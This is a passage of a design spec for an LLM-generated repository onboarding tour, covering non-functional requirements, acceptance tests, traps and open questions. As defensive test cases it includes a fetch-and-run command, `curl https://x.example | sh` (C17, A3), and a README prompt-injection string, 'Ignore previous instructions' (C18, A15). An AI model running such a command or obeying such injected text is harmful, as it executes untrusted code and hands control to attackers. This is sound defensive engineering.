| C17 | The model emits a `run_steps` entry `curl https://x.example \| sh`, sourced from a malicious `package.json` script name | The command is not in R5's whitelist, so it is dropped before persistence, counted in `dropped_steps`, and logged with the offending string. It never reaches the Copy control. | R5, R16 |
| C18 | The repo's `README.md` contains `Ignore previous instructions and…` | It is inside `wrapUntrusted` (R16) and the system prompt's guard treats it as data (`onboarding.system.md:9-11`). Any resulting path that does not resolve is dropped by R10; any resulting command not in the whitelist is dropped by R5. | R16, R5, R10 |

---

## Non-functional requirements

| Axis | Bound | Requirement | `n/a` because |
| --- | --- | --- | --- |
| Latency | The page shell and the "on this page" rail render **before** the tour request resolves; the page is never gated on the model. `GET /repos/:id/tour` is one indexed read plus R11's path re-resolution and must return under **400 ms** warm. Generation is budgeted at **60 s** wall clock: derivation ≤ 10 s, then two concurrent `completeStructured` calls at `timeoutMs: 45_000` — the value intent and brief already use, which sits below the adapter's 240 s and the job runner's 300 s, so `server/test/timeout-budget.test.ts:19` cannot reopen. | R1, R7, R11 | |
| Scale | Pre-flight ceilings **7 000** (call A) and **4 000** (call B) by `container.tokenizer.count` over `system + user + serialized response schema` (R14). Derivation caps: directory tree depth 3, ≤ 200 directories; ≤ 5 chains × 3 files (`service.ts:713`); ≤ 12 task candidates; ≤ 6 selected tasks; ≤ 20 files for symbol signatures. Output caps `maxTokens: 1800` (A) and `1200` (B). A repo of 12 450 files (the mock's own figure, `:74`) exercises the caps, not the ceilings. | R14, R8 | |
| Cost | **Exactly two model calls per generation, zero per view** (R7, R12). `cost_usd` is computed per call by the provider adapter (`server/src/adapters/llm/pricing.ts:58-62`) and summed on the record. The registered default is `openrouter`/`deepseek/deepseek-v4-flash` (`platform.ts:43-50`), which — unlike `review_intent` and `risk_brief` — has **not** been revisited since the pricing work and may not be in `PRICING`, in which case `cost_usd` is `null` and the feature reports no cost at all → Q4. | R7, R12, R15 | |
| Failure | Degraded, never hard, for every dependency: the index, the clone, ripgrep, discovery, each model call. The only hard refusal is C1 (no index), which is a rendered explanation and a disabled button, not a `5xx`. Over-budget (R14) produces a stored, explained record. | R17, R18 | |
| Security | Untrusted: every path, symbol name, script name and value, env-var name, compose service name, TODO text, and document body — all wrapped per R16. Two outputs escape the page into the world and both are gated in code: a **command** a human is invited to paste into a shell (R5's whitelist) and a **path** rendered as a link (R10 at write, R11 at read). No `.env`/`.env.local` value is read; `.env.example` contributes names only. Nothing from the model is ever executed server-side. | R5, R10, R11, R16 | |
| Accessibility | Each section header is a real `<button>` with `aria-expanded`/`aria-controls`; the "on this page" rail is a `<nav>` of real anchors reachable by Tab in document order; every Copy control is a labelled button announcing the copy, not an icon-only `<span>` as the mock draws it (`24-screen_tour_context.jsx:55`). The rendered mermaid `<svg>` carries a text alternative naming the directories it shows, since a diagram with no fallback is the entire architecture section for a screen-reader user. | R23, R20 | |
| i18n | Every string is a key under the existing `onboarding` namespace (R21), including the three difficulty labels and every per-section empty and degraded message. `sectionCount` uses the explicit `{count, number}` form — a bare `{count}` is string interpolation (`client/INSIGHTS.md:227-235`). Paths, commands and env-var names are never translated (`onboarding.system.md:45-47` already states this for the model). | R21 | |
| Observability | R15's per-call fields make a bad tour diagnosable cold: which inputs were dropped, how close each call ran to its ceiling, **how far `budget_tokens` drifted from the provider's `tokens_in`** (the measurement that exposed the brief's 612-vs-2 006 envelope gap, `server/INSIGHTS.md:286-302`), how many paths R10 rejected, and how many commands R5 rejected. Without them this feature has no trace at all — a standalone `POST` has no `run_traces` row. | R15 | |

---

## Acceptance criteria — EARS

| ID | Criterion | Req | Verify by |
| --- | --- | --- | --- |
| A1 | **When** a viewer opens a repo whose `indexed_sha`, indexer version, prompt version, provider and model are unchanged since the last tour, the server **shall** return the cached `TourRecord` and **shall** make no model call. | R12 | server `tour.it.test.ts` — mock LLM whose call counter reads exactly `2` after two `POST`s |
| A2 | **The** tour service **shall** persist and render only paths that resolve to a file or directory present in the derived fact set at generation time. | R10 | server hermetic `tour-grounding.test.ts` — fixture output naming `src/does-not-exist.ts`; asserts absence and `dropped_refs === 1` |
| A3 | **The** tour service **shall not** persist a `run_steps[].command` that is absent from the whitelist derived from the repo's config facts. | R5 | server hermetic `tour-steps.test.ts` — fixture output emitting `curl https://x.example \| sh`; asserts it is absent and `dropped_steps === 1` |
| A4 | **The** tour service **shall not** persist a `tasks[]` entry whose `candidate_id` is absent from the candidate set supplied to call B. | R8 | server hermetic `tour-tasks.test.ts` — fixture output inventing `cand_zz`; asserts it is dropped |
| A5 | **The** tour service **shall** set each task's `difficulty` from the R9 rubric and **shall** discard any `difficulty` present in the model response. | R9 | server hermetic `tour-difficulty.test.ts` — table-driven over `(C, P)` boundaries `(2,49)`, `(3,49)`, `(15,89)`, `(16,0)`, `(0,90)`, plus a fixture response asserting `"high"` is overridden to `"low"` |
| A6 | **The** tour service **shall** measure each call's input as `system + user + JSON.stringify(responseSchema)` with `container.tokenizer.count` and **shall** keep call A at or below 7 000 and call B at or below 4 000 tokens on every call it makes. | R14 | server hermetic `tour-budget.test.ts` — `ContainerOverrides.tokenizer` counting fixture; asserts the measured string contains the serialized schema and each measure is within ceiling |
| A7 | **If** a call's input still exceeds its ceiling after every droppable input is removed, **then** the server **shall not** make that call, and **shall** persist that call's sections with `error: 'input_over_budget'`. | R14, R17 | server hermetic test — 5 000-file fixture; asserts LLM call count for A is `0` and B still ran |
| A8 | **The** tour service **shall** issue exactly two `completeStructured` invocations per generation, each with `maxRetries: 0`. | R7 | server hermetic `tour-service.test.ts` — asserts invocation count `2` and the `maxRetries` argument on both |
| A9 | **If** one of the two calls fails or times out, **then** the server **shall** return `200` with `degraded: true`, `degraded_sections` naming only that call's sections, and the other call's sections fully populated. | R7, R17, C13 | server `tour.it.test.ts` — LLM mock that throws on the second invocation only |
| A10 | **When** a stored path no longer resolves against the current index, the client **shall** render it non-interactive with a "no longer in the repo" note and **shall not** navigate on click. | R11, C12 | `TourView.test.tsx` — record with one deleted path against a fixture index; asserts no `href`/`onClick` and the note is present |
| A11 | **When** `repo_index_state.last_indexed_sha` differs from the record's `indexed_sha`, the client **shall** show the stale marker with the record's 7-character sha and **shall not** fire a regeneration on render. | R13 | `TourView.test.tsx` — asserts `shortSha` renders and no mutation fires on rerender |
| A12 | **Where** the repo has no index or its index status is `failed`, the client **shall** render the not-indexed explanation with a disabled *Generate* control. | R18, C1 | `TourView.test.tsx` (`status: 'failed'` fixture, asserts `disabled`) · `e2e/specs/13-onboarding-tour.flow.json` |
| A13 | **Where** no tour has been generated, the client **shall** render the generate CTA, a token-cost estimate and a time estimate rather than nothing. | R1, Q2 | `TourView.test.tsx` (query resolves `null`) · `e2e/specs/13-onboarding-tour.flow.json` |
| A14 | **The** client **shall** render all five sections in the order architecture → critical paths → how to run → guided reading → first tasks, with an "on this page" anchor per section. | R20, design `:3-13,71` | `TourView.test.tsx` (asserts DOM order and one anchor per `kind`) · `e2e/specs/13-onboarding-tour.flow.json` |
| A15 | **The** model input **shall** enclose every repository-derived string in `<untrusted>` blocks and **shall** place instructions and the output schema outside them. | R16 | server hermetic `tour-prompt.test.ts` — asserts each derived field appears only between delimiters, and that a `README` containing `</untrusted>` is escaped (`reviewer-core/src/prompt.ts:46`) |
| A16 | **The** tour service **shall not** include any value read from `.env` or `.env.local` in either model input. | R4, Security | server hermetic `tour-prompt.test.ts` — clone fixture with a sentinel secret in `.env`; asserts the sentinel is absent from both captured inputs |
| A17 | **The** persisted `TourRecord` **shall** carry, per call, `budget_tokens`, `tokens_in`, `tokens_out`, `cost_usd`, `provider`, `model` and `prompt_version`, including on a degraded generation (`cost_usd` excepted). | R15 | server `tour.it.test.ts` — asserts each column non-null on the success and the failure path |
| A18 | **The** recorded `tokens_in` for a real generation **shall** be within 15 % of `budget_tokens + 300`, or the discrepancy **shall** be logged at `warn` with both numbers. | R14, R15 | server hermetic test on the comparison helper · one manual generation against a real imported, indexed repo, with the two columns read back by SQL |
| A19 | **The** `POST /repos/:id/tour` route **shall** reject the 6th request in a minute with `429`. | R22 | server `tour.it.test.ts` (its own Fastify app instance — a shared one leaks rate-limit state, `specs/10-pr-brief.md` A18's lesson) |
| A20 | **The** client **shall** render no hardcoded user-facing string in the tour page; every string **shall** resolve through the `onboarding` message namespace. | R21 | `TourView.test.tsx` under `NextIntlClientProvider`; a missing key throws |
| A21 | **Where** the architecture section's `diagram` is `null` or fails `mermaid.parse`, the client **shall** render the section body with no diagram container and **shall not** throw. | R23, C4, C10 | `TourView.test.tsx` with `diagram: null` and with `diagram: "flowchart LR\nA[[broken"` |
| A22 | **The** nav **shall** contain an `onboarding-tour` entry pointing at `/repos/:repoId/tour`, and `/onboarding` **shall** continue to render the add-repository form. | R20 | `e2e/specs/13-onboarding-tour.flow.json` (nav click reaches the tour) · existing `e2e/specs/06-onboarding.flow.json` still green |
| A23 | **When** a section's derived input set is empty, the client **shall** render that section's named empty message and **shall not** render an empty card. | C5, C6, C7 | `TourView.test.tsx` — three fixtures, one per empty section |
| A24 | **The** tour **shall** be generated and rendered correctly against a real imported and indexed repository, not only against the seeded demo. | R2, R3, R6 | **manual** — import and index a real repo, generate, and check that critical paths and guided reading are non-empty. `server/INSIGHTS.md:129-141`: the seeded demo returns "index unavailable" from every `repo-intel`-backed path forever, so a green suite proves nothing here |
| A25 | **The** `OnboardingSection.kind` field **shall** reject any value outside the five-section enum. *Verify by:* a server hermetic contract test parsing a fixture with `kind: 'not-a-section'` and asserting the parse fails — the narrowing in R19 is a typecheck-time claim otherwise, and a widened enum would pass silently. | R19 | server hermetic test |

---

## Traps

1. **The seeded demo repo cannot exercise this feature at all.** Every
   `repo-intel`-backed path returns "index unavailable" against the seed
   (`server/INSIGHTS.md:129-141`). Four of the five sections are `repo-intel`-backed.
   A fully green `pnpm test` plus a passing e2e flow is compatible with the feature
   never having produced a single real chain. A24 exists for exactly this.
2. **`modules/blast` is the wrong door.** It is PR-scoped —
   `BlastService.forPull(workspaceId, prId)`, `server/src/modules/blast/service.ts:27`
   — and `specs/08-blast-radius.md:56-59` says that is deliberate. The arbitrary-file
   entry point is on the `repoIntel` facade: `getBlastRadius(repoId, changedFiles)`
   (`repo-intel/service.ts:221`). R9 uses the facade. Reaching into `modules/blast`
   also trips `pnpm arch`'s `no-cross-module-internals`, as it did for brief
   (`specs/10-pr-brief.md:358-362`).
3. **`getCriticalPaths` is not a UI-to-DB trace and must not be described as one.** It
   greedily follows the highest-ranked import target from the top 5 ranked files, two
   hops (`repo-intel/service.ts:670-713`). The index is JS/TS-only
   (`repo-intel/constants.ts:16`) and knows nothing about SQL, HTTP clients or layers,
   so no cross-stack "request reaches the database" edge exists anywhere in this repo.
   The section is honest as "the chains that most of the code depends on"; it is a lie
   as "how a request travels to the database". The model must not be given a section
   title that invites the second reading.
4. **The pre-flight counter is a floor, not the billed number.** Measured on the first
   real brief: gate `612`, billed `2 006` — a 1 394-token structured-output envelope
   (`server/INSIGHTS.md:286-302`, `server/src/adapters/tokenizer/index.ts:22-24`).
   R14 counts the serialized response schema for this reason, and this feature's schema
   is substantially larger than the brief's. A named allowance was the alternative and
   was rejected here because it goes stale the instant the schema gains a field.
5. **`onboarding.system.md` exists and is already half-right.** It has the security
   paragraph, the grounding rules, the mermaid rules and a `{{sections}}` placeholder
   — but it names `routes_and_apis`, which this spec drops, and it invites the model to
   author the diagram, which R2 forbids. Editing it is part of the work; treating it as
   a finished artefact reintroduces a section nobody asked for.
6. **`client/messages/en/onboarding.json` describes a different feature.** Its
   `generate.body` lists five sections that are not these five (R21). Shipping the page
   against those strings ships a CTA that promises the wrong thing.
7. **The `onboarding` table cannot hold the cache key.** One row per repo, no key
   columns (`schema/context.ts:120-126`). Persisting into it as-is silently discards
   R12 and the tour never goes stale.
8. **Never hand-write the migration** (`server/AGENTS.md`) — edit the table in
   `server/src/db/schema/context.ts` and run `pnpm db:generate`.
9. **`/onboarding` is the add-repo wizard.** Mock 15, `AddRepoView`, e2e flow 06. The
   tour goes at `/repos/[repoId]/tour` (R20).

---

## Open questions

| ID | Question | My proposed default | Blocks |
| --- | --- | --- | --- |
| Q1 | The mock draws a *Share link* control (`24-screen_tour_context.jsx:76`) but no sharing surface exists in this product. Is it a link to the in-app URL, or an export? | **Omit it.** `design-mocks/src/20-screen_export.jsx`-style export is a separate feature; an in-app URL is already the address bar. | nothing — the page ships without it |
| Q2 | The empty state promises *"30–60s and ~5,000 tokens"* (`:64`). R14's ceilings sum to 11 000 pre-flight, and R15 will record a billed number higher again. What does the CTA say? | State a range from the two ceilings — "up to ~11,000 tokens, 30–60s" — and revise it from real `tokens_in` data once a handful of tours exist, the way `risk_brief`'s default model was revised. | A13's exact string |
| Q3 | Each critical-path file has an *Open* button (`:50`), but the client has no file-viewer route. | Link to the file at the repo's host provider at the tour's `indexed_sha`, opening in a new tab. It is one line and it is honest about what it can do. | nothing — R11 governs the dead-link case either way |
| Q4 | The `onboarding` feature model default is `openrouter`/`deepseek/deepseek-v4-flash` (`platform.ts:43-50`) — the only registry entry not revisited during the pricing work, and possibly absent from `PRICING` (`server/src/adapters/llm/pricing.ts:10-56`), which would make `cost_usd` permanently `null`. | Keep the default, and treat "`cost_usd` is null for the registered default" as a defect to fix in `PRICING` rather than a reason to change the model. Confirm with the CTO, as Q7 on the brief was. | the Cost NFR being measurable |
| Q5 | Should a repo's attached project-context documents (`specs/09-project-context.md`) be an input, or only the discovered ones? | **Discovered, not attached** (P6). Attachments are scoped to an agent or a skill (`schema/project-context.ts:26-47`), never to a system feature, and `specs/09-project-context.md:61-69` puts attaching to system features out of scope. Reading the *discovered* list needs no new attachment semantics. | P6's exact source |
| Q6 | Does the tour regenerate automatically after a `resync`, or only on demand? | **On demand only.** R12 makes it a cache miss and R13 marks it stale; auto-regeneration would spend money on every index of every repo, unprompted. | nothing |
| Q7 | Depth 3 for the architecture tree — deep enough for a monorepo like this one (`server/src/modules/repo-intel/pipeline/`)? | Depth 3, with any deeper directory rolled into its depth-3 ancestor's file count and named in that ancestor's note. Revisit if a real repo's tree reads as flat. | the Scale NFR's cap |

---

## Could not establish

- **Whether `deepseek/deepseek-v4-flash` can produce reliable structured output at
  this schema's size.** It is the registered default (`platform.ts:43-50`) and no
  code path has ever called it, so there is no evidence in this repository either way.
  R7's `maxRetries: 0` means a malformed response is a degradation, not a retry — if
  that model degrades often, the feature will look broken for a reason that is a
  configuration choice, not a design fault. Q4.
- **The real ratio between R14's pre-flight count and the provider's `tokens_in` for
  this feature's schemas.** The only measurement in this repository is the brief's
  612-vs-2 006 (`server/INSIGHTS.md:286-302`), on a much smaller schema and a different
  provider. R14 counts the serialized schema to close most of that gap, and A18 makes
  the residual visible, but the 7 000 / 4 000 ceilings are reasoned, not measured. They
  should be re-derived from the first ten real generations.
- **How `getCriticalPaths` behaves on a real repository.** Its output on the seeded
  demo is empty by construction (`server/INSIGHTS.md:129-141`), and I did not run it
  against an imported repo. Whether five chains of depth 2 read as a useful "how things
  move" section, or as five near-identical chains through the same hub file, is
  unknown. If it is the latter, R3's section is the one that needs redesign, and a
  chain-deduplication rule would be the fix.
- **The real distribution of first-task candidates.** All four generators (R8) are
  plausible from the schema, but I have no measurement of how many `TODO` markers,
  untested `core` files or unresolved references a typical imported repo yields. A repo
  with 400 TODOs and one with none are both handled (the cap and C7), but which is
  typical decides whether the section is useful or noise.
- **Whether `container.codeIndex.grep`'s pure-Node fallback (`ripgrep.ts:50-54`) is
  fast enough on a 12 450-file repo** for the `todo_marker` generator inside the 10 s
  derivation budget. `@vscode/ripgrep` is an optional dependency resolved at runtime;
  I did not measure the fallback.
